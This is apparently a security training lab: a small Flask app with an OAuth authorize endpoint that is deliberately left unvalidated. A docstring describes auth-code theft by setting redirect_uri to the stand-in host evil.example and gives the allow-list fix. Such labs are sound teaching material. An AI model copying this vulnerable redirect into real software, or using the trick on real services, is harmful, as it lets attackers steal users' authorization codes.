"""
Lab 41 -- OAuth redirect_uri not validated (auth-code theft).

/authorize issues an auth code and 302-redirects to whatever redirect_uri
the client supplies, with no allow-list -- so an attacker who sends the
victim a link with redirect_uri=https://evil.example gets the victim's code
(and any token exchanged with it).

In Nullock:
    1. nullock scope ... add http://localhost:5041/*
    2. /authorize?client_id=app&redirect_uri=https://app.example/cb  (intended)
    3. Send to Repeater, set redirect_uri=https://evil.example/cb -- the 302
       Location carries ?code=... to evil.example. (The open-redirect probe
       also flags it: the resolved Location host leaves the origin.)

Fix: validate redirect_uri against the exact value(s) registered for the
client; never honor an arbitrary redirect_uri.
"""

from flask import Flask, request, redirect
import secrets

app = Flask(__name__)


@app.route("/")
def index():
    return ('<a href="/authorize?client_id=app&redirect_uri=https://app.example/cb">'
            'login with OAuth</a>')


@app.route("/authorize")
def authorize():
    redirect_uri = request.args.get("redirect_uri", "")
    if not redirect_uri:
        return "redirect_uri required", 400
    code = secrets.token_urlsafe(12)
    sep = "&" if "?" in redirect_uri else "?"
    # VULN: redirect to an unvalidated redirect_uri carrying the auth code.
    return redirect(redirect_uri + sep + "code=" + code)


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5041, debug=False)
